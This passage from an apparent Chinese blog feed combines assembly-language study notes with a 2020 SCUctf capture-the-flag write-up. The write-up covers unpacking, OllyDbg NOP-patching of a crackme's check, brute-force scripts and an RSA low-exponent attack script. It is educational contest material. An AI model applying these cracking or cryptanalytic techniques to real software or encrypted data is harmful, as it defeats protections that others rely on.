<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">    dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line"></span><br><span class="line">    start: mov bx,0</span><br><span class="line">           mov ax,0</span><br><span class="line"></span><br><span class="line">           mov cx,8</span><br><span class="line"></span><br><span class="line">        s: add ax,cs:[bx]</span><br><span class="line">           add bx,2</span><br><span class="line">           loop s</span><br><span class="line"></span><br><span class="line">           mov ax,4c00h</span><br><span class="line">           int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<p>在这里，在程序的第一条指令的前面加上了一个标号<code>start</code>，而这个标号在伪指令<code>end</code>后面出现。<code>end</code>除了通知编译器程序结束外，还可以通知编译器程序的入口在什么地方。在上面，我们用<code>end</code>指令指明了程序的入口在标号<code>start</code>处，也就是说”mov bx,0”是程序的第一条指令。</p>
<p>而第一条指令是由可执行文件中的描述信息指明的。可执行文件由描述信息和程序组成，程序来自于源程序中的汇编指令和定义的数据：描述信息则主要是编译、连接程序对源程序中相关伪指令进行处理所得到的信息。在上面的程序，用伪指令<code>end</code>描述了程序的结束和程序的入口。在编译、连接后，由“end start”指明的程序入口，被转化为一个入口地址，存储在可执行文件的描述信息中。</p>
<h2 id="在代码段中使用栈"><a href="#在代码段中使用栈" class="headerlink" title="在代码段中使用栈"></a>在代码段中使用栈</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line"></span><br><span class="line">    dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line"></span><br><span class="line">    dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">                        ;用dw定义16个字型数据，在程序加载后，将取得16个字的</span><br><span class="line">                        ;内存空间，存放这16个数据。在后面的程序中将这段</span><br><span class="line">                        ;空间当作栈来使用</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">start:  mov ax,cs</span><br><span class="line">        mov ss,ax</span><br><span class="line">        mov sp,30h      ;将设置栈顶ss:sp指向cs:30</span><br><span class="line"></span><br><span class="line">        mov bx,0</span><br><span class="line">        mov cx,8</span><br><span class="line">    s:  push cs:[bx]</span><br><span class="line">        add bx,2</span><br><span class="line">        loop s          ;以上将代码段0~15中的8个字型数据依此入栈</span><br><span class="line"></span><br><span class="line">        mov bx,0</span><br><span class="line">        mov cx,8</span><br><span class="line">    s0: pop cs:[bx]</span><br><span class="line">        add bx,2</span><br><span class="line">        loop s0         ;以上依次出栈8个字型数据到代码段0~15单元中</span><br><span class="line"></span><br><span class="line">        mov ax,4c00h</span><br><span class="line">        int 21h</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<p>在代码段中定义了16个字型数据，它们的数值都是0，但是无论它们的值是多少对程序来说都没有意义。我们定义16个数据是要将他们用作栈空间。</p>
<h2 id="将数据、代码、栈放入不同的段"><a href="#将数据、代码、栈放入不同的段" class="headerlink" title="将数据、代码、栈放入不同的段"></a>将数据、代码、栈放入不同的段</h2><p>我们可以用和定义代码段一样的方法来定义多个段，然后在这些段里面定义需要的数据，或通过定义数据来取得占空间。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cs:code,ds:data,ss:stack</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line"></span><br><span class="line">    dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line"></span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">stack segment</span><br><span class="line"></span><br><span class="line">    dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line"></span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">start: mov ax,stack</span><br><span class="line">       mov ss,ax</span><br><span class="line">       mov sp,20h   ;设置栈顶ss:sp指向stack：20</span><br><span class="line"></span><br><span class="line">       mov ax,data</span><br><span class="line">       mov ds,ax    ;ds指向data段</span><br><span class="line"></span><br><span class="line">       mov bx,0</span><br><span class="line"></span><br><span class="line">       mov cx,8</span><br><span class="line"></span><br><span class="line">    s: push [bx]</span><br><span class="line">       add bx,2</span><br><span class="line">       loop s</span><br><span class="line"></span><br><span class="line">       mov cx,8</span><br><span class="line">    s0: pop [bx]</span><br><span class="line">       add bx,2</span><br><span class="line">       loop s0</span><br><span class="line"></span><br><span class="line">       mov ax,4c00h</span><br><span class="line">       int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<ol>
<li>定义多个段的方法</li>
</ol>
<blockquote>
<p>定义一个段的方法和钱买你定义代码段的方法相同，知识对于不同的段，要有不同的段名。</p>
</blockquote>
<ol start="2">
<li>对段地址的引用</li>
</ol>
<blockquote>
<p>我们知道，地址分为段地址和偏移地址。在程序中，段名就相当于一个标号，它代表了段地址。所以指令<code>mov ax,data</code>的含义就是将名为<code>data</code>的段的段地址送入<code>ax</code>。一个段中的数据的段地址可有段名代替，偏移地址就要看它在段中的位置。</p>
</blockquote>
<ol start="3">
<li>“代码段”、“数据段”、“栈段”由我们自己设定</li>
</ol>
<blockquote>
<p>我们为3个段起名，这样命名是为了使程序便于阅读。<br>我们在源程序中用伪指令<code>assume cs:code,ds:data,ss:stack</code>将<code>cs</code>、<code>ds</code>和<code>ss</code>分别和<code>code</code>、<code>data</code>、<code>stack</code>段相连。但是CPU也并不会将<code>cs</code>指向<code>code</code>，<code>ds</code>指向<code>data</code>，<code>ss</code>指向<code>stack</code>，因为<code>assume</code>使伪指令，是由编译器执行的。它将我们定义的具有一定用途的段和相关的寄存器联系起来。</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>汇编语言学习（十）</title>
    <url>/2021/03/22/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%8D%81%EF%BC%89/</url>
    <content><![CDATA[<h1 id="汇编语言学习（十）"><a href="#汇编语言学习（十）" class="headerlink" title="汇编语言学习（十）"></a>汇编语言学习（十）</h1>]]></content>
  </entry>
  <entry>
    <title>汇编语言学习（四）</title>
    <url>/2021/02/19/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    <content><![CDATA[<h1 id="汇编语言学习（四）"><a href="#汇编语言学习（四）" class="headerlink" title="汇编语言学习（四）"></a>汇编语言学习（四）</h1><p>本篇开始编写完整的汇编语言程序，用编译和连接程序将它们编译连接成为可执行文件，在操作系统中运行。</p>
<h2 id="一个源程序从写出到执行的过程"><a href="#一个源程序从写出到执行的过程" class="headerlink" title="一个源程序从写出到执行的过程"></a>一个源程序从写出到执行的过程</h2><p>第一步：编写汇编源程序</p>
<blockquote>
<p>使用文本编辑器，用汇编语言编写汇编源程序。这一步工作的结果时产生了一个存储源程序的文本文件。</p>
</blockquote>
<p>第二步：对源程序进行编译连接</p>
<blockquote>
<p>使用汇编语言编译程序对源程序文件中的源程序进行编译，产生目标文件；再用连接程序对目标文件进行连接，生成可在操作系统中直接运行的可执行文件。</p>
</blockquote>
<p>可执行文件包含两部分内容：</p>
<ul>
<li>程序（从源程序中的汇编指令翻译过来的机器码）和数据（源程序中定义的数据）</li>
<li>相关的描述信息（比如，程序有多大、要占多少内存空间等）</li>
</ul>
<p>第三步：执行可执行文件中的程序。</p>
<p>在操作系统中，执行可执行文件中的程序。</p>
<p>操作系统依照可执行文件中的描述信息，将可执行文件中的机器码和数据加载入内存，并进行相关的初始化（比如设置CS:IP指向第一条要执行的指令），然后由CPU执行程序。</p>
<h2 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h2><p>一段简单的汇编语言源程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mov ax,0123H</span><br><span class="line">    mov bx,0456H</span><br><span class="line">    add ax,bx</span><br><span class="line">    add ax,ax</span><br><span class="line"></span><br><span class="line">    mov ax,4c00H</span><br><span class="line">    int 21H</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>下面对程序进行说明：</p>
<ol>
<li><strong>伪指令</strong></li>
</ol>
<p>在汇编语言源程序中包含两种指令，一种是汇编指令，一种是伪指令。汇编指令是有对应的机器码的指令，可以被编译为机器指令，最终为CPU所执行。而伪指令没有对应的机器指令，最终不被CPU所执行，由编译器执行。</p>
<p>在上述程序中出现了3种伪指令。</p>
<ol>
<li><p>XXX segment</p>
<pre><code> ：

 ：

 ：
</code></pre>
<p> XXX ends</p>
</li>
</ol>
<p><code>segment</code>和<code>ends</code>是一对成对使用的伪指令，这是在写可被编译器编译的汇编程序时，必须要用到的一对伪指令。<code>segment</code>和<code>ends</code>的功能是定义一个段，<code>segment</code>说明一个段开始，<code>ends</code>说明一个段结束。一个段必须有一个名称来标识，使用格式如下：</p>
<p>段名 segment</p>
<pre><code>    :
</code></pre>
<p>段名 ends</p>
<p>上面的“codesg”就是段名</p>
<p>一个汇编程序是由多个段组成的，这些段被用来存放代码、数据或当作栈空间使用。</p>
<ol start="2">
<li>end</li>
</ol>
<p><code>end</code>是一个汇编程序的结束标记，编译器在编译汇编程序的过程中，如果碰到了伪指令<code>end</code>，就结束对源程序的编译。</p>
<blockquote>
<p>注意：end与ends不同。ends和segment成对使用，标记一个段的结束，ends的含义可以理解为“end segment”。而这里的end标记整个程序的结束。</p>
</blockquote>
<ol start="3">
<li>assume</li>
</ol>
<p>这条伪指令的含义为“假设”。它假设某一段寄存器和程序中的某一个用<code>segment...ends</code>定义的段相关联。</p>
<blockquote>
<p>只需记住<code>assume</code>将有特定用途的段和相关的段寄存器关联起来。</p>
</blockquote>
<p>在上面用<code>codesg segment ... codesg ends</code>定义了一个名为<code>codesg</code>的段，在这个段中存放代码，因此这个段是一个代码段。在程序的开头用<code>assume cs:codesg</code>将用作代码段的段<code>codesg</code>和CPU中的段寄存器<code>cs</code>联系起来。</p>
<ol start="2">
<li><strong>源程序中的“程序”</strong></li>
</ol>
<p>用汇编语言写的源程序，包括伪指令和汇编指令，最终目的是让计算机完成一定的任务。源程序中的汇编指令组成了最终由计算机执行的程序，而源程序中的伪指令是由编译器来处理的，它们并不实现编程的最终目的。这里所说的程序是指源程序中最终由计算机执行、处理的指令或数据。</p>
<ol start="3">
<li><strong>标号</strong></li>
</ol>
<p>汇编源程序中，除了汇编指令和伪指令外，还有一些标号，比如<code>codesg</code>。一个标号指代了一个地址。<code>codesg</code>在<code>segment</code>的前面，作为一个段的名称，这个段的名称最终将被编译、连接程序处理为一个段的段地址。</p>
<p><img src="https://gitee.com/auxein/images/raw/master/assembly_language/1212.jpg"></p>
<ol start="4">
<li><strong>程序的结构</strong></li>
</ol>
<p>实例：编程运算 2^3。</p>
<ol>
<li>定义一个段，名称为<code>abc</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abc segment</span><br><span class="line"></span><br><span class="line">    :</span><br><span class="line"></span><br><span class="line">abc ends</span><br></pre></td></tr></table></figure></li>
<li>写入汇编指令<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abc segment</span><br><span class="line"></span><br><span class="line">    mov ax,2</span><br><span class="line">    add ax,ax</span><br><span class="line">    add ax,ax</span><br><span class="line"></span><br><span class="line">abc ends</span><br></pre></td></tr></table></figure></li>
<li>指明程序结束</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abc segment</span><br><span class="line"></span><br><span class="line">    mov ax,2</span><br><span class="line">    add ax,ax</span><br><span class="line">    add ax,ax</span><br><span class="line"></span><br><span class="line">abc ends</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<ol start="4">
<li><code>abc</code>被当作代码段来用，所以应该将<code>abc</code>和<code>cs</code>联系起来。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cs:abc</span><br><span class="line"></span><br><span class="line">abc segment</span><br><span class="line"></span><br><span class="line">    mov ax,2</span><br><span class="line">    add ax,ax</span><br><span class="line">    add ax,ax</span><br><span class="line"></span><br><span class="line">abc ends</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure></li>
<li>程序返回</li>
</ol>
<p>在上面的程序中有两条指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br></pre></td></tr></table></figure>

<p>这两条指令所实现的功能就是程序返回</p>
<p>与结束相关的概念：</p>
<table>
<thead>
<tr>
<th>目的</th>
<th>相关指令</th>
<th>指令性质</th>
<th>指令执行者</th>
</tr>
</thead>
<tbody><tr>
<td>通知编译器一个段的结束</td>
<td>段名 ends</td>
<td>伪指令</td>
<td>编译时，由编译器执行</td>
</tr>
<tr>
<td>通知编译器程序结束</td>
<td>end</td>
<td>伪指令</td>
<td>编译时，由编译器执行</td>
</tr>
<tr>
<td>程序返回</td>
<td>mov ax,4c00H   int 21H</td>
<td>汇编指令</td>
<td>执行时，由CPU执行</td>
</tr>
</tbody></table>
<ol start="6">
<li>语法错误和逻辑错误</li>
</ol>
<p>例如：<code>aume cs:abc</code></p>
<p>编译器不能识别<code>aume</code></p>
<h2 id="编辑源程序"><a href="#编辑源程序" class="headerlink" title="编辑源程序"></a>编辑源程序</h2><p>可以使用任意的文本编辑器来编辑源程序，只要最终将其存储为纯文本文件即可。文件后缀为<code>.asm</code></p>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>在编译的过程中，需要提供一个输入，即源程序文件。最多可以得到三个输出：目标文件（.obj）、列表文件(.lst)、交叉引用文件（.crf），这三个输出文件中，目标文件是最终要得到的结果。</p>
<h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><p>在对源程序进行编译得到文件后，需要对目标文件进行连接，从而得到可执行文件。假设已经对<code>1.asm</code>进行编译得到<code>1.obj</code>，现在再将<code>1.obj</code>连接为<code>1.exe</code>。</p>
<p>连接的作用：</p>
<ol>
<li>当源程序很大时，可以将它分为多个源程序文件来编译，每个源程序编译成为目标文件后，再用连接程序将它们连接到一起，生成一个可执行文件；</li>
<li>程序中调用了某个库文件中的子程序，需要将这个库文件和该程序生成的目标文件连接到一起，生成一个可执行文件；</li>
<li>一个源程序编译后，得到了存有机器码的目标文件，目标文件中的有些内容还不能直接用来生成可执行文件，连接程序将这些内容处理为最终的可执行信息。在只有一个源程序文件，而又不需要调用某个库中的子程序的情况下，也必须用连接程序对目标文件进行处理，生成可执行文件。</li>
</ol>
<h2 id="操作系统的外壳"><a href="#操作系统的外壳" class="headerlink" title="操作系统的外壳"></a>操作系统的外壳</h2><p>操作系统是由多个功能模块组成的庞大、复杂的软件系统。任何通用的操作系统，都要提供一个称为shell（外壳）的程序，用户使用这个程序来操作计算机系统进行工作。</p>
<p>DOS中有一个程序<code>command.com</code>，这个程序在DOS中被称为命令解释器，也就是DOS系统中的shell。</p>
<p>DOS启动时，先完成其他重要的初始化工作，然后运行<code>command.com</code>，<code>command.com</code>运行后，执行完其他的相关任务后，在屏幕显示出由当前盘符和当前路径组成的提示符，比如：“c:\”或“c:\windows”等，然后等待用户的输入。</p>
<p>用户可以输入所要执行的命令，比如：cd、dir、type等，这些命令由command执行，执行完后再次显示由当前盘符和当前路径组成的提示符，等待用户的输入。</p>
<p>如果用户要执行一个程序，则输入该程序的可执行文件的名称，command首先根据文件名找到可执行文件，然后将这个可执行文件中的程序加载入内存，设置<code>CS：IP</code>指向程序的入口。此后，command暂停运行，CPU运行程序。程序运行结束后，返回到command中，command再次显示由当前盘符和当前路径组成的提示符，等待用户的输入。</p>
<p><strong>汇编程序从写出到执行的过程</strong></p>
<blockquote>
<p>编程 -&gt; 1.asm -&gt; 编译 -&gt; 1.obj -&gt; 连接 -&gt; 1.exe -&gt; 加载 -&gt; 内存中的程序 -&gt; 运行</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>2020SCUctf</title>
    <url>/2020/11/29/2020scuctf/</url>
    <content><![CDATA[<h1 id="加v看蟹黄堡秘方-19级-writeup"><a href="#加v看蟹黄堡秘方-19级-writeup" class="headerlink" title="加v看蟹黄堡秘方-19级 writeup"></a>加v看蟹黄堡秘方-19级 writeup</h1><p>written by</p>
<p><em>mahor0</em></p>
<p><em>Raylin</em></p>
<hr>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><hr>
<h3 id="EasyF5"><a href="#EasyF5" class="headerlink" title="EasyF5:"></a>EasyF5:</h3><p>一键F5<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/easyf5.png/"><br>得到flag</p>
<hr>
<h3 id="easypack"><a href="#easypack" class="headerlink" title="easypack"></a>easypack</h3><p>使用upx脱壳</p>
<p><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/easypack1.png"></p>
<p>使用OD打开<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/easypack2.png"><br>使用插件中文搜索中的智能搜索<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/easypack3.png"><br>双击跳转<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/easypack4.png"><br>打断点<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/easypack5.png"><br>F9运行，随意输入<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/easypack6.png"><br>发现flag<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/easypack7.png"></p>
<hr>
<h3 id="pytrade"><a href="#pytrade" class="headerlink" title="pytrade"></a>pytrade</h3><p>反编译结果如下<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/pytrade1.png"><br>Base64解码得到flag<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/pytrade2.png"></p>
<hr>
<h3 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h3><p>OD运行，通过中文搜索引擎智能搜索，双击选中error进入</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.1.png"></p>
<p>选中输入验证码跳转处</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.2.png"></p>
<p>找到跳转开始处</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.3.png"></p>
<p>nop</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.5.png"></p>
<p>选中刚才用NOP填充的代码段，右键单击“复制到可执行文件”，“选择”，在新弹出的界面上点击右键–单击“保存文件”,然后选择保存路径和文件名</p>
<p>打开刚保存的文件，得到flag</p>
<p><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/crackme.png"></p>
<hr>
<h3 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h3><p>使用ida,F5<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/maze1.png"><br>查看伪代码码知道DUR分别表示下上右三个方向，查看maze<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/maze2.png"><br>分析知为15* 10，写python脚本得到迷宫</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">maze = <span class="string">&#x27; *   *****   * *********  *********    *********&#x27;</span></span><br><span class="line">maze_len = <span class="built_in">len</span>(maze)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,maze_len-<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(maze[i:i + <span class="number">10</span>])</span><br></pre></td></tr></table></figure>
<p>通过DUR三个控制方向即可获得flag</p>
<p><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/maze3.png"></p>
<hr>
<h3 id="decryptme"><a href="#decryptme" class="headerlink" title="decryptme"></a>decryptme</h3><p>ida一键F5<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/decrptme1.png"><br>写python脚本爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">encode_str=<span class="string">&#x27;34e8h9?&lt;&lt;mkCD&gt;F@DEDCzHxxKRQRNSRS&#x27;</span></span><br><span class="line">len_of_str = <span class="built_in">len</span>(encode_str)</span><br><span class="line"><span class="built_in">str</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_of_str):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>,<span class="number">123</span>):</span><br><span class="line">        v7 = j</span><br><span class="line">        v6 = i</span><br><span class="line">        v4 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            v4 = <span class="number">2</span> * (v6 &amp; v7)</span><br><span class="line">            v7 ^= v6</span><br><span class="line">            v6 = v4</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> v4:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(v7) == encode_str[i]:</span><br><span class="line">            <span class="built_in">str</span> += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>得到结果</p>
<p><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/decrptme2.png"></p>
<p>代入验证<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/decrptme3.png"></p>
<hr>
<h3 id="pytrade-plus"><a href="#pytrade-plus" class="headerlink" title="pytrade-plus"></a>pytrade-plus</h3><p>反编译<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/pytrade-plus1.png"><br>了解MVC知道controller就是要找的文件<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/pytrade-plus2.png"><br>使用在线反编译<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/pytrade-plus3.png"><br>得到代码，开始解方程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy <span class="keyword">as</span> sp</span><br><span class="line">magicnum = <span class="number">6022643662067204678412214834917825274663312630925087389260279631835650751300240970025848237913353272826623631607</span></span><br><span class="line">x = sp.Symbol(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">f = x ** <span class="number">7</span> - <span class="number">300</span> * x ** <span class="number">6</span> - x ** <span class="number">3</span> + x - <span class="number">6022643662067204678412214834917825274663312630925087389260279631835650751300240970025848237913353272826623631607</span></span><br><span class="line">x = sp.solve(f)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure>
<p>得到x=<code>9301243714092307</code>，转换得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">b&quot;9301243714092307&quot;</span></span><br><span class="line">flag = binascii.b2a_hex(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>得到flag=39333031323433373134303932333037，代入验证</p>
<p><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/pytrade-plus4.png"></p>
<hr>
<h2 id="MiSC"><a href="#MiSC" class="headerlink" title="MiSC"></a>MiSC</h2><hr>
<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>关注公众号</p>
<hr>
<h3 id="easy-encode"><a href="#easy-encode" class="headerlink" title="easy_encode"></a>easy_encode</h3><p>下载得到<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/easy_encode1.png"><br>猜测为摩斯密码，在word文件里进行替换<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/easy_encode2.png"><br>解密得到thankyoufororderingyeltsakcir‘<a class="link"   href="mailto:&#x73;&#x66;&#108;&#x61;&#103;&#100;&#x65;&#x6c;&#x69;&#118;&#x65;&#x72;&#121;&#x79;&#111;&#x75;&#114;&#x66;&#108;&#x61;&#103;&#105;&#115;&#115;&#x63;&#117;&#99;&#x74;&#102;&#x72;&#x33;&#x40;&#x64;&#x5f;&#98;&#x33;&#x74;&#x77;&#51;&#51;&#110;&#x5f;&#116;&#104;&#51;&#x5f;&#108;&#49;&#110;&#x33;&#115;&#x2e;&#x77;&#x65;&#x68;&#x6f;&#x70;&#101;&#x79;&#111;&#117;&#108;&#x69;&#107;&#x65;&#111;&#x75;&#114;&#115;&#x65;&#x72;&#x76;&#105;&#99;&#101;&#x61;&#110;&#100;&#116;&#114;&#121;&#97;&#103;&#x61;&#105;&#x6e;" >&#x73;&#x66;&#108;&#x61;&#103;&#100;&#x65;&#x6c;&#x69;&#118;&#x65;&#x72;&#121;&#x79;&#111;&#x75;&#114;&#x66;&#108;&#x61;&#103;&#105;&#115;&#115;&#x63;&#117;&#99;&#x74;&#102;&#x72;&#x33;&#x40;&#x64;&#x5f;&#98;&#x33;&#x74;&#x77;&#51;&#51;&#110;&#x5f;&#116;&#104;&#51;&#x5f;&#108;&#49;&#110;&#x33;&#115;&#x2e;&#x77;&#x65;&#x68;&#x6f;&#x70;&#101;&#x79;&#111;&#117;&#108;&#x69;&#107;&#x65;&#111;&#x75;&#114;&#115;&#x65;&#x72;&#x76;&#105;&#99;&#101;&#x61;&#110;&#100;&#116;&#114;&#121;&#97;&#103;&#x61;&#105;&#x6e;<i class="fas fa-external-link-alt"></i></a>.<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/easy_encode3.png"></p>
<hr>
<h3 id="Excalibur"><a href="#Excalibur" class="headerlink" title="Excalibur"></a>Excalibur</h3><p>用jd-gui打开<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/excalibur1.png"><br>得到flag</p>
<p><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/excalibur2.png"></p>
<hr>
<h3 id="ylbnb"><a href="#ylbnb" class="headerlink" title="ylbnb!"></a>ylbnb!</h3><p>训练了“人工”智能，证明如下(误<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/ylbnb1.jpg"></p>
<p><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/ylbnb2.jpg"></p>
<p><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/ylbnb3.jpg"></p>
<p><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/ylbnb4.jpg"></p>
<hr>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><hr>
<h3 id="classic-1"><a href="#classic-1" class="headerlink" title="classic_1"></a>classic_1</h3><p>凯撒密码</p>
<hr>
<h3 id="classic-2"><a href="#classic-2" class="headerlink" title="classic_2"></a>classic_2</h3><p>hex-base64-莫斯<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/classic_2.png"><br>得到scuctf%u7b041918fc1ef6348768578f505f69d197%u7d</p>
<p>%u7b和%u7d替换成{}</p>
<hr>
<h3 id="RSA-1-与-RSA-3"><a href="#RSA-1-与-RSA-3" class="headerlink" title="RSA_1 与 RSA_3"></a>RSA_1 与 RSA_3</h3><p>rsa1与rsa3均可使用如下脚本进行低指数加密攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"><span class="comment"># 读入 n，密文</span></span><br><span class="line">n= <span class="number">17076697689025821279984148703479525857912324396375097877800474725170566885465833732966897433803722770843910606215420934526050277173030062927090405120718833473629930226217051580832179577629652910778242159108718885516149768995851175071714817922775555170553827627677999093195969471873530031984433631909841287167351534954860426002075822101506835880510505034002629168205724869128357383388034971402180363910826536064357845040799329301895842061729319929568340334416516796267886218679042058969927331452548377324349084816441144473807565907927986545026739667157223640848553663532280797054758912745891410981282851031085852562257</span></span><br><span class="line">c= <span class="number">892408374578063131162925795619920779766603018609992406621503024400320421262482556891045333045408815199768659578199823419716777827460090306221618906101139272423449131313434967763664295600593363990276765767066758967765012850672428517786210813209127040442832574380675662826137452780727264357</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;n=&#x27;</span>, n</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c=&#x27;</span>, c</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[+]Detecting m...&#x27;</span></span><br><span class="line">result = gmpy2.iroot(c, <span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;  [-]The c has cubic root?&#x27;</span>, result[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> result[<span class="number">1</span>]: <span class="built_in">print</span> <span class="string">&#x27;  [-]The m is:&#x27;</span>, <span class="string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(result[<span class="number">0</span>]).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[!]All Done!&#x27;</span></span><br></pre></td></tr></table></figure>
<p>结果如下<br><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/rsa_1.png"></p>
<p><img src="https://gitee.com/auxein/images/raw/master/scuctf2020/rsa_3.png"></p>
<hr>
<h3 id="math-1"><a href="#math-1" class="headerlink" title="math_1"></a>math_1</h3><p>中国剩余定理，脚本如下</p>
